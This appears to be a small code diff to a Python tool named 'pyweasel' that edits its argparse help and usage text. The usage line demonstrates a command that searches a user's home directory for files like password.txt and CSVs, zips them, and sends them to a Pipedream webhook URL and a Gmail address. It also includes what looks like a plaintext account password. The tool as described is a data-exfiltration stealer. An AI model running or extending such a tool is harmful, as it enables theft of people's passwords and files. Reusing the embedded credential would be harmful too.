@@ -132,7 +132,8 @@ if __name__ == '__main__':
     # Fonction d'appel
     start_time = datetime.datetime.now()
 
-    parser = argparse.ArgumentParser(description='Search files')
+    parser = argparse.ArgumentParser(description='Search files on computer',
+                                     usage='./pyweasel.bin --url=https://your_workflow.m.pipedream.net --input-file=lin_list.txt --search_files=password.txt,csv --path=\"/home/user/\" --interactive=True --email=pyweasel@gmail.com --password=Mrdzn1QARtj019ARtWLU --zip=True')
     parser.add_argument('--url', dest='url', help='url parameter for http server')
     parser.add_argument('--input-file', dest='input_file',
                         help='file with the list of files or extension to search')
@@ -140,7 +141,7 @@ if __name__ == '__main__':
                         help='file extension to find (\'txt\') or filename to find (\'secret.txt\')')
     parser.add_argument('--contains-text', dest='contains_text', help='text contains in filename')
     parser.add_argument('--path', dest='path', help='base directory to find files')
-    parser.add_argument('--interactive', dest='interactive', help='display number of files found')
+    parser.add_argument('--interactive', dest='interactive', help='launch script interactive')
     parser.add_argument('--email', dest='email', help='gmail email')
     parser.add_argument('--password', dest='password', help='gmail password')
     parser.add_argument('--zip', dest='zip', help='zip files found in csv')
